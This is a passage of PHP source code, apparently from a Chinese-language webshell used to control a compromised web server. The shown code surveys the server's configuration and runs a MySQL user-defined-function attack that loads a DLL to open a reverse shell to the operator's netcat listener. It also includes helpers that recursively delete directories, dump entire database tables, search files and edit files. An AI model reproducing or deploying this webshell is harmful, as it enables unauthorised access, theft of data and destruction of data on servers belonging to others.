	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		$info = array(
		    0 => array("当前php进程用户",$user),
			1 => array("服务器操作系统",PHP_OS),
			2 => array("服务器时间",date("Y年m月d日 h:i:s",time())),
			3 => array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
			4 => array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
			5 => array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
			6 => array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
			7 => array("Web服务端口",$_SERVER['SERVER_PORT']),
			8 => array("PHP运行方式",strtoupper(php_sapi_name())),
			9 => array("PHP版本",PHP_VERSION),
			10 => array("运行于安全模式",getphpcfg("safemode")),
			11 => array("服务器管理员",$adminmail),
			12 => array("本文件路径",__FILE__),
            13 => array("允许使用 URL 打开文件 allow_url_fopen",getphpcfg("allow_url_fopen")),
			14 => array("允许动态加载链接库 enable_dl",getphpcfg("enable_dl")),
			15 => array("显示错误信息 display_errors",getphpcfg("display_errors")),
			16 => array("自动定义全局变量 register_globals",getphpcfg("register_globals")),
			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
			18 => array("程序最多允许使用内存量 memory_limit",getphpcfg("memory_limit")),
			19 => array("POST最大字节数 post_max_size",getphpcfg("post_max_size")),
			20 => array("允许最大上传文件 upload_max_filesize",$upsize),
			21 => array("程序最长运行时间 max_execution_time",getphpcfg("max_execution_time")."秒"),
			22 => array("被禁用的函数 disable_functions",$dis_func),
			23 => array("phpinfo()",$phpinfo),
			24 => array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
            25 => array("图形处理 GD Library",getfun("imageline")),
			26 => array("IMAP电子邮件系统",getfun("imap_close")),
			27 => array("MySQL数据库",getfun("mysql_close")),
			28 => array("SyBase数据库",getfun("sybase_close")),
			29 => array("Oracle数据库",getfun("ora_close")),
			30 => array("Oracle 8 数据库",getfun("OCILogOff")),
			31 => array("PREL相容语法 PCRE",getfun("preg_match")),
			32 => array("PDF文档支持",getfun("pdf_close")),
			33 => array("Postgre SQL数据库",getfun("pg_close")),
			34 => array("SNMP网络管理协议",getfun("snmpget")),
			35 => array("压缩文件支持(Zlib)",getfun("gzclose")),
			36 => array("XML解析",getfun("xml_set_object")),
			37 => array("FTP",getfun("ftp_login")),
			38 => array("ODBC数据库连接",getfun("odbc_close")),
			39 => array("Session支持",getfun("session_start")),
			40 => array("Socket支持",getfun("fsockopen")),
		); 
	$tb->tableheader();
	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
	$tb->tdbody('<b>查看PHP配置参数状况</b>','left','1','30','style="padding-left: 5px;"');
	$tb->tdbody('请输入配置参数(如:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','查看','','submit'),'left','2','30','style="padding-left: 5px;"');
	$tb->makehidden('do','viewphpvar');
	echo "</form>\n";
	$hp = array(0=> '服务器特性', 1=> 'PHP基本特性', 2=> '组件支持状况');
	for ($a=0;$a<3;$a++) {
		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?><?php
		if ($a==0) {
			for($i=0;$i<=12;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 1) {
			for ($i=13;$i<=24;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 2) {
			for ($i=25;$i<=40;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?><?php
	}//for
echo "</table>";
}//end phpenv

elseif($_GET['action'] == "mysqlfun"){
	  echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
	if($_POST['port'] != "" && $_POST['ip'] != "" && $_POST['function'] != ""  && $_POST['host'] != "" && $_POST['user'] != "")
    {
		$link=@mysql_connect($_POST['host'],$_POST['user'],$_POST['pass']);
		if (!$link) {
			 echo "<font color=red>Could not connect: ".mysql_error()."</font><br>";
			 }
			 else{
			 echo "<font color=blue>Connected successfully as ".$_POST['user']."</font><br>";
			 if(isset($_POST['mixpath'])&&!@file_exists($_POST['mixpath'])){
				 echo"<font color=red>Can't find the ".$_POST['mixpath']."</font><br>";
			 }
				 if(isset($_POST['mixpath'])){
			 $dll_path = addslashes($_POST['mixpath']);
			 $query="create function ".$_POST['function']." returns integer soname '".$dll_path."';";
			 echo (@mysql_query($query, $link)) ? "<font color=blue>Success: ".$query."</font><br>" : "<font color=red>Create function faild!<br>".mysql_error()."</font><br>";
			 }
			 echo"<font color=red>Now Select Function name of ".$_POST['function']."</font><br>";
			 $query="select ".$_POST['function']."('".$_POST['ip']."','".$_POST['port']."');";
			 echo (@mysql_query($query, $link)) ? "<font color=blue>Success: ".$query."</font><br>" : "<font color=red>Select Function name of ".$_POST['function']." faild!<br>".mysql_error()."</font><br>";
			 mysql_close($link);
			 }
			 }else{
			 echo"Help?? View <A href=\"http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006\" target=\"_blank\">http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006</a>";
			 }
			 echo "</td></tr></table>";
			 if($nodll=="yes"){
				 $echodll = " <a href=\"#\" title=\"使用说明\" onclick=\"alert('这里的文件名将会被addslashes函数把\\\\\\变成 \\\\\\\，全部写完便可以提交。\\n\\n请事先在自己机器运行nc -vv -l -p 端口，全部运行完mysql会假死。')\">(?)</a>&nbsp;    Mixdll　:
      <input name=\"mixpath\" type=\"text\" class=\"INPUT\"  value=\"C:\mix.dll\" size=\"50\"> &nbsp;<a href=\"?action=mysqlfun\">(已有function)</a>";
			 }else{
				 $echodll = "<FONT color=\"blue\">此步利用已建function进行工作。</FONT> &nbsp;<a href=\"?action=mysqlfun&nodll=yes\">(未建function)</a>";
			 }
?><?php
	if($job!=="adduser"){
	?><?php
	  }
		?><?php
}
?><?php
	debuginfo();
	ob_end_flush();	
	?><?php

/*======================================================
函数库
======================================================*/

	// 登陆入口
	function loginpage() {
	//global $amdin[alexa];
?><?php
		exit;
	}//end loginpage()

	// 页面调试信息
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// 去掉转义字符
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// 删除目录
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	} 

	// 判断读写情况
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// 表格行间的背景色替换
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// 获取当前的文件系统路径
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// 检查PHP配置参数
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}

	// 检查函数情况
	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}

	// 压缩打包类
	class zip //ZIP压缩类
{

 var $datasec, $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0; var $dirs = Array(".");

 function Add($files,$compact)
 {
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename($fn[0]))
     $ret[basename($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
 }
function get_file()
 {
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }
 function ReadCentralDir($zip,$zip_name)
 {
  $size = filesize($zip_name);
  if ($size < 277) $maximum_size = $size;
  else $maximum_size=277;
  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;
  while ($pos < $size)
  {
    $byte = @fread($zip, 1); $bytes=($bytes << 8) | Ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }
  $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));
  if ($data['comment_size'] != 0)
	  $centd['comment'] = fread($zip, $data['comment_size']);
  else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
 }
  function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);
	if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';
	if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';
	if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';
	if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }
 function add_dir($name) 
 { 
   $name = str_replace("\\", "/", $name); 
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 

   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 
   $this -> datasec[] = $fr;

   $new_offset = strlen(implode("", $this->datasec)); 

   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
   $ext = "\xff\xff\xff\xff"; 
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name; 

   $this -> ctrl_dir[] = $cdrec; 
   $this -> old_offset = $new_offset; 
   $this -> dirs[] = $name;
 }
 function get_List($zip_name)
 {
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);
   @rewind($zip);
    @fseek($zip, $centd['offset']);
	for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
 }
 function add_File($data, $name, $compact = 1)
 {
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());

   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');

   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);

   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );

   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
 }

 function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] < 1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | 
    ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
 }
  function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
      
   }
   fclose($zip);
   return $stat;
 }
 function ExtractFile($header,$to,$zip)
 {
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size < 2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size < 1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress閑");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size < 2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
 }
   function ReadFileHeader($zip)
  { 
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }
}
function addziparray($dir2) //添加ZIP文件
{
	global $dir,$zipfilearray;
	@$dirs=opendir($dir."/".$dir2);
	while (@$file=readdir($dirs)) { 
		if(!is_dir("$dir/$dir2/$file")) {
			$zipfilearray[]="$dir2/$file";
		}
		elseif($file!="."&&$file!="..") {
			addziparray("$dir2/$file");
		}
	}
	@closedir($dirs);
}

	// 备份数据库
	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);
	
		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
			echo "  </tr>\n";
		}
		function length($str){//可以统计中文字符
		$len=strlen($str);
		$i=0;
		while($i<$len){
		if(preg_match("/^[".chr(0xa1)."-".chr(0xff)."]+$/",$str[$i])){
		$i+=2;
		}else{
		$i+=1;
		}
		$n+=1;
		}
		return $n;
		}
		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}

		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"确定\"></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";
		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}
	
	function find($path) //查找关键词 
{ 
	global $_POST,$type,$type2,$endline,$beline,$nb; 
	if(is_dir("$path")){ 
	$tempdir=opendir("$path");
	while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
	closedir($tempdir);
	}else{ 
	if(filesize("$path")){ 
	$fp=fopen("$path","r"); 
	$msg=fread($fp, filesize("$path"));
	fclose($fp); 
if(strpos($msg, $_POST['oldkey']) !== false) {
	$dir = dirname($path);
	$file = basename($path);
	$nb++;
if($type=="list"){
	$mymsg = explode("\n",$msg);
	$long = count($mymsg);
	$tmp = explode($oldkey,$msg);
	$tmp = explode("\n",$tmp[0]);
	$first = count($tmp);
	$end = "[".$first."/".$long."]";
}
if($type2=="getpath"){
	$get = explode($oldkey,$msg);
	$get = strlen($get[0]);
	if(isset($beline)){
	$get = $get-$beline;
	}
	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
	$getpath = "title = \"".$getpath."\"";
}
echo "<span class=\"redfont\" $getpath>找到:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
}
                              } 
                         }                    
} 
?>